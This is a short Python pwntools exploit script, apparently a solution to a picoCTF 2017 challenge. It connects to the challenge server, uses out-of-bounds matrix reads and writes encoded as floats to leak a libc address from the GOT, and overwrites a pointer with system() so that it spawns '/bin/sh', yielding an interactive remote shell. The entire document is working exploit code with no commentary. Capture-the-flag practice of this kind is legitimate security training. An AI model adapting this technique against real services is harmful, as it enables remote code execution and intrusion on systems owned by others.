#!/usr/bin/env python2
from pwn import *
from struct import pack,unpack
setbuf_got_plt = 0x0804A104
setbuf_offset = 0x6b350
system_offset = 0x3e3e0
r = remote("shell2017.picoctf.com",19369)
r.send("create 10 5\n")
r.send("create 3 3\n")
r.send("create 2 2\n")
r.send("set 0 5 4 %.9g \n"%(unpack(">f",pack(">I",setbuf_got_plt))[0]))
r.send("get 1 0 0\n")
r.recvuntil("Matrix[0][0] = ")
real_setbuf = unpack(">I",pack(">f",float(r.recvline().strip())))[0]
libc_base = real_setbuf-setbuf_offset
system_addr = libc_base + system_offset
r.send("set 1 0 2 %.9g \n"%(unpack(">f",pack(">I",system_addr))[0]))
r.send("set 2 0 0 %.9g \n"%(unpack("<f","/bin")[0]))
r.send("set 2 0 1 %.9g \n"%(unpack("<f","/sh\x00")[0]))
r.send("destroy 2\n")
r.interactive()